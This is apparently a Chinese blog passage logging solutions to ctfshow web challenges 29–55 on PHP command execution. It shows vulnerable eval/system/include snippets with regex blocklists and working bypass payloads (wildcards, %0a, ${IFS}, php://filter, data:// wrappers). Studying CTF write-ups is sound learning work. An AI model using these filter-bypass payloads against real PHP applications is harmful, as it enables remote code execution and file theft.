---
title: ctfshow刷题-命令执行
date: 2022-01-20 23:12:14
tags:
      - RCE
      - ctfshow
      - web
categories: ctfshow
---

ctfshow web入门 命令执行做题记录<!--more-->

### web29

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

过滤flag并且禁用了cat命令

payload`?c=system('tac ./fla*');`

本题中绕过使用到了linux中的通配符知识

#### linux中命令行通配符以及转义符的实现

##### 通配符

- 星号(*)代表匹配零个或多个字符

- 问号(?)代表匹配单个字符

- 中括号用法和正则表达式相同

##### 转义符

- 反斜杠,使反斜杠后面的一个变量变成单纯的字符串

![image-20220120233012920](https://gitee.com/blue_satchel/images/raw/master/image-20220120233012920.png)

- 反引号(``),把其中的命令之后后返回结果

- 单引号('  '),其中的所有内容都会变成单纯的字符串

### web30

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

system被ban了

再找一个php中能执行系统命令的函数

payload

```
c=echo `tac fla*`;
```

反应号包裹等于shell_exec()

### web31

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这次过滤连空格都给过滤了,利用passthru函数绕过

payload`c=passthru($_POST["a"]);`

### web32

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

本题上升了些难度,反引号,分号,括号都被过滤了

参考了WP,得到payload,既然是参考,就要理解透彻为什么可以这样做

```
c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

preg_match是单行匹配,可以使用%0a换行符绕过,include后面如果跟的如果是变量,不需要加括号,GET里面的key为数字时,可以不用加引号,语句后面立马跟上变量1的值

php中可以把`?>`当做一次性的`;`来使用

### web33

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

本题双引号单引号都被过滤了

可以使用和上一题相同的做法来做

查看hint后,

```php
c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-
encode/resource=flag.php
```

对开头使用`c=?><?=include$_GET[1]?>`有点疑惑

经过试验,发现`?><?`这个东西居然不影响正常语句的执行

![image-20220121174741643](https://gitee.com/blue_satchel/images/raw/master/image-20220121174741643.png)

echo成功输出1

### web34

和32 33同理

### web35

和32同理

### web36

```php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
```

本题相较于35,增加了数字的过滤,看了hint

在换行符生效之前,%0a中的0会被匹配到,但是php中如果使用变量做include参数,甚至可以不用空格

payload

```php
c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

### web37

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

本题需要在不匹配到flag的情况下包含flag.php

起初尝试了%0a,php://filter,数组绕过都失败了

查看hint,发现可以使用data://伪协议

payload

```php
c=data://text/plain;base64,PD9waHAgaW5jbHVkZSgnZmxhZy5waHAnKT8%2b
```

##### data://伪协议

自PHP5.2.0起,数据流封装器开始有效,主要用于数据流的读取,如果传入的数据是php代码,就会执行任意代码使用方法如下:

`data://text/plain,<?php phpinfo();?>`

`data://text/plain;base64,xxxxxxxxx(base64编码后的数据)`

利用data://时,PHP配置文件需开启allow_url_include和allow_url_fopen

data://伪协议示例代码如下

```php
<?php
    $filename=$_GET['filename'];
	include($filename);
?>
```

通过data://伪协议传送`<?php phpinfo();?>`代码的base64编码,这样就可以执行代码

`?filename=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b`

注意点:要对`+`进行手动url编码为%2b![img](https://gitee.com/blue_satchel/images/raw/master/Image(17).png)



### web38

和web37同理

### web39

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }      
}else{
    highlight_file(__FILE__);
}
```

本题还是使用data://但是不能使用base64编码了,因为使用了base64编码在执行代码的时候会对后面的.php也解码,解码完就啥都不是了,但是如果直接使用明文php代码,后面的.php没有被php代码块包裹就会被当成普通的html字符串输出到页面

payload

`?c=data://text/plain,<?php system('tac fla*');?>`

### web40

```php
<?php
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

本题看似过滤了很多,但是没有过滤英文括号和分号,所以可以大量使用函数

这道题凸显出了自己对php知之甚少

`next()` — 将数组中的内部指针向前移动一位

`array_reverse()` — 返回单元顺序相反的数组

`pos()`--该函数是`current()`函数的别名  `current` — 返回数组中的当前值

`scandir()` — 列出指定路径中的文件和目录

![image-20220121214803840](https://gitee.com/blue_satchel/images/raw/master/image-20220121214803840.png)

网上的payload

- `show_source(next(array_reverse(scandir(pos(localeconv())))));`

payload()解释:通过localeconv()可以获得一个数字和货币信息关联的数组,不知道这个是干嘛的,但是其第一个元素为`.`,这样就可以通过`pos`拿到`.`并交给scandir()获取当前目录下的文件名数组,因为flag.php排在第三个,通过next和array_reverse的操作拿到flag.php的文件名传递给show_source()

但是有个疑问,为啥最后给show_source传递参数不需要pos或者current来获取当前数组中的值了呢,原来是next会在移动指针后返回当前单元的值......

- `eval(array_pop(next(get_defined_vars())));`

`array_pop()` — 弹出数组最后一个单元（出栈）

通过get_defined_vars()可以获取包含当前的全部变量的数组

### web41

```php
<?php
if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

这题第一眼就想到用反引号来做,但是没反应

看了wp发现是利用异或运算符生成字符来绕过,等会续写脚本

### web42

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

这题很有意思,`>/dev/null 2>&1`的意思是把所有的标准输入输入到黑洞里面(也就是不做任何显示),`2>&1`的意思是将错误输出重定向到标准输出

可以使用命令连接符`;`来让上面的操作都只操作最后一个命令,不操作前面的命令

payload`tac flag.php;ls`

### web43

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

相较于上题,多过滤了;和cat,思路还是一样,在找个命令连接符就行了

[命令连接符总结](../../21/命令连接符总结/)

两个payload

`c=tac flag.php&&ls`,但是&不会自动编码,得手动url编码一下才行

`tac flag,php%0a`利用换行符

### web44

同理,用`*`绕过flag就行了

`c=tac flag.php&&ls`

### web45

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

本题多了个空格的过滤,想办法绕过空格过滤z

payload

`c=tac${IFS}fl*%26%26ls`

给的payload

```bash
echo$IFS`tac$IFS*`%0A
```

经过这道题应该总结一下linux中rce的空格绕过方法了

#### linux中rce的空格绕过方法

##### 1)${}IFS}绕过

$IFS是shell的特殊环境变量,是linux下的内部域分隔符.${IFS}中存储的值可以是空格/制表符/换行符或者其他自定义符号

##### 2)$IFS$9绕过

##### 3)制表符绕过

%09是制表符的url编码,可以通过%09来代替空格,绕过空格过滤

##### 4){ }绕过

空格过滤可以用{ }绕过,例如

{cat,index.php}

##### 5)<绕过

例如cat<index.php

### web46

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);

```

本题相较上题添加了对`*`数字和$符号的过滤,使得绕过空格时的前三种方法失效

`c=tac%09fla?.php%26%26ls`

本来想用`{}`和`<`绕过,但是经过测试,发现这两种方法好像不支持通配符的使用,不能用?代替某个缺失字符,必须是全名

%09虽然有数字,但是其被解码后是制表符,不会被过滤

### web47

同上,只是多增加了几个对读取文件的命令的过滤

### web48

同上

### web49

还是没有过滤tac,用一样的payload

### web50

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

本题增加了对制表符,`&`符号的过滤,但是没有或符号

payload`?c=tac<fla''g.php||ls`

`c=nl<fla''g.php||ls`如果使用nl的话,读出来需要查看源码

如若要使用<绕过空格过滤,必须是全名,可以使用''来绕过并补全文件名

### web51

多了一个对tac的过滤,用nl操作

`c=nl<fla''g.php||ls`

### web52

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```



这题把`<`过滤了,但是把`$`放出来了

`c=nl${IFS}fla''g.php||ls`

得到这样的flag`$flag="flag_here";`

后面发现根目录也有一个flag,想办法读取根目录这个flag文件

payload`c=nl${IFS}/fla''g||ls`



### web53

payload`c=nl${IFS}fl?g.php`

### web54

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

这题乍一看吓一跳,感觉作用就是把使用单引号绕过给安排了

nl也被做掉了

`?`倒是还健在

想尝试用cp命令来操作,

`cp${IFS}fl?g.php${IFS}a.txt`,起初以为是语句有问题,在虚拟机上测试成功创建了,这里可能是没有写文件的权限,失败了

cp命令要求对源文件可读,对目标文件夹可写

最后用重命名命令`rm`,`rename`命令无法使用

payload`c=mv${IFS}fl?g.php${IFS}a.txt`

### web55

```php
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

唯一的想法就是用特殊符号异或绕过,看了大佬的WP

`.`命令相当于`source`命令,可以把一个文件的内容当做shell执行

### web56

经
